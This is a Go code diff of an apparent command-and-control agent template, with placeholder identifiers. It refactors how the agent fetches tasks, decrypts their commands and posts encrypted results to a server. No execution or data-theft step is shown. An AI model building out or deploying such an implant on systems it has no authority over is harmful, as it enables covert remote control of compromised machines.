@@ -6,14 +6,13 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_TASKS_FUNC}() ([]{TASK_STRUCT_NAME}, er
 
 	if resp.Status == "success" {
 		tasks := resp.Tasks
+
 		for i := range tasks {
 			if a.{AGENT_SECRET_KEY_FIELD} != nil {
 				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(tasks[i].{TASK_COMMAND_FIELD})
 				if err == nil {
 					tasks[i].{TASK_COMMAND_FIELD} = decryptedCmd
-				} else {
 				}
-			} else {
 			}
 		}
 		return tasks, nil
@@ -41,25 +40,46 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_INTERACTIVE_COMMAND_FUNC}() (*{TASK_STR
 		return nil, err
 	}
 
-	if resp.Status == "success" && resp.Command != "" {
-		taskID, err := strconv.ParseInt(resp.TaskID, 10, 64)
-		if err != nil {
-			taskID = 0 // Default to 0 if parsing fails
+	if resp.Status == "success" {
+		// Convert TaskID to string regardless of whether it's a number or string
+		taskIDStr := ""
+		switch v := resp.TaskID.(type) {
+		case string:
+			taskIDStr = v
+		case float64: // JSON numbers are unmarshaled as float64
+			taskIDStr = fmt.Sprintf("%.0f", v) // Convert to integer string
+		case int64:
+			taskIDStr = fmt.Sprintf("%d", v)
+		case int:
+			taskIDStr = fmt.Sprintf("%d", v)
+		case nil:
+			taskIDStr = ""
+		default:
+			taskIDStr = fmt.Sprintf("%v", v)
 		}
 
-		task := &{TASK_STRUCT_NAME}{
-			{TASK_ID_FIELD}:      taskID,
-			{TASK_COMMAND_FIELD}: resp.Command,
-		}
-
-		if a.{AGENT_SECRET_KEY_FIELD} != nil {
-			decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(task.{TASK_COMMAND_FIELD})
-			if err == nil {
-				task.{TASK_COMMAND_FIELD} = decryptedCmd
+		if resp.Command != "" {
+			taskID, err := strconv.ParseInt(taskIDStr, 10, 64)
+			if err != nil {
+				taskID = 0 // Default to 0 if parsing fails
 			}
-		}
 
-		return task, nil
+			task := &{TASK_STRUCT_NAME}{
+				{TASK_ID_FIELD}:      taskID,
+				{TASK_COMMAND_FIELD}: resp.Command,
+			}
+
+			if a.{AGENT_SECRET_KEY_FIELD} != nil {
+				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(task.{TASK_COMMAND_FIELD})
+				if err == nil {
+					task.{TASK_COMMAND_FIELD} = decryptedCmd
+				}
+			}
+
+			return task, nil
+		} else {
+			return nil, nil
+		}
 	}
 
 	return nil, nil
@@ -93,7 +113,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result str
 		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
 		if err != nil {
 			encryptedResult = result
-		} else {
 		}
 	} else {
 		encryptedResult = result
@@ -104,13 +123,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result str
 		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
 	}
 
-	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_RESULTS_URI_FIELD}, data)
-	if err != nil {
-		return err
-	} else {
-		if resp != nil {
-		}
-	}
-	return nil
+	_, err = a.{AGENT_SEND_FUNC}("POST", a.{AGENT_RESULTS_URI_FIELD}, data)
+	return err
 }
 
